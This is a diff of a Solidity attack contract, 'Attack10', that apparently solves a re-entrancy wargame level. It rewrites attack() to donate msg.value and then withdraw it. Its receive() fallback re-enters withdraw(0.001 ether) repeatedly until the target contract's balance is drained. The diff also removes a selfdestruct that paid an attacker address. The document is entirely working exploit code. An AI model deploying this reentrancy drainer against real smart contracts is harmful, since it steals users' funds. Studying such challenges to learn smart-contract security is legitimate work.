@@ -6,28 +6,21 @@ import "interfaces/ire-entrancy.sol";
 
 contract Attack10 {
     ReentrantInterface reentrance;
-    address payable public hackerman;
-    uint public amount;
 
-    constructor(address _reEntrancyAddress, uint _amount) public {
+    constructor(address _reEntrancyAddress) public {
         reentrance = ReentrantInterface(_reEntrancyAddress);
-        amount = _amount;
     }
 
     function attack() public payable {
-        reentrance.donate{value: amount}(address(this));
-        reentrance.withdraw(amount);
-    }
-
-    function destroy() public {
-        selfdestruct(hackerman);
+        reentrance.donate{value: msg.value}(address(this));
+        reentrance.withdraw(msg.value);
     }
 
     receive() external payable {
         uint targetBalance = address(reentrance).balance;
 
-        if (targetBalance >= amount) {
-            reentrance.withdraw(amount);
+        if (targetBalance >= 0.001 ether) {
+            reentrance.withdraw(0.001 ether);
         }
     }
 }
